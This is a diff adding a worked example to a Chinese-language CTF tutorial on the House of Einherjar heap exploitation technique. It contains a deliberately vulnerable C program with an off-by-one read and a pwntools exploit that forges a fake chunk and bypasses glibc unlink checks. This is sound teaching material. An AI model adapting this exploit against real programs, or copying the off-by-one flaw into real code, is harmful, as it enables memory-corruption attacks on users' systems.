@@ -64,6 +64,94 @@ house of einherjar 是一种堆利用技术，由 `Hiroki Matsukuma` 提出。�
 
 ![](/pwn/heap/figure/einherjar_after_overflow.png)
 
+### 攻击过程示例
+
+可以进行 House Of Einherjar 攻击的代码：
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+ 
+int main(void){
+    char* s0 = malloc(0x200);　//构造fake chunk
+    char* s1 = malloc(0x18); 
+    char* s2 = malloc(0xf0);　
+    char* s3 = malloc(0x20); //为了不让s2与top chunk 合并
+    printf("begin\n"); 
+    printf("%p\n", s0);
+    printf("input s0\n");
+    read(0, s0, 0x200); //读入fake chunk
+    printf("input s1\n");
+    read(0, s1, 0x19); //Off By One
+    free(s2);
+    return 0;
+}
+```
+
+攻击代码如下：
+
+```python
+from pwn import *
+ 
+p = process("./example")
+context.log_level = 'debug'
+#gdb.attach(p)
+p.recvuntil("begin\n")
+address = int(p.recvline().strip(), 16)
+p.recvuntil("input s0\n")
+payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
+'''
+p64(address) * 2是为了绕过
+if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
+  malloc_printerr ("corrupted double-linked list");  
+'''
+payload += p64(0x100) #fake size
+p.sendline(payload)
+p.recvuntil("input s1\n")
+payload = "A"*0x10 + p64(0x220) + "\x00"
+p.sendline(payload)
+p.recvall()
+p.close()
+```
+
+**注意这里绕过unlink检查的方法跟之前利用unlink漏洞时采用的方法不一样**
+
+利用unlink漏洞的时候：
+
+```c
+ p->fd = &p-3*4
+ p->bk = &p-2*4
+```
+
+在这里利用时，因为没有办法找到 `&p`  ,所以直接让：
+
+```c
+p->fd = p
+p->bk = p
+```
+
+**这里需要注意一个点：**
+
+```python
+payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
+```
+
+其实修改为下面这样也是可以的:
+
+```python
+payload = p64(0) + p64(0x221) + p64(address) * 2 + "A"*0xe0
+```
+
+按照道理来讲 fake chunk 的 size 是 `0x221`  才合理，但是为什么  `0x101` 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:
+
+```c
+if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+      malloc_printerr ("corrupted size vs. prev_size");     
+```
+
+所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。
+
 ### 总结
 
 这里我们总结下这个利用技术需要注意的地方
@@ -249,4 +337,4 @@ if __name__ == "__main__":
 
 - https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606
 - https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf
-
+- https://bbs.pediy.com/thread-226119.htm
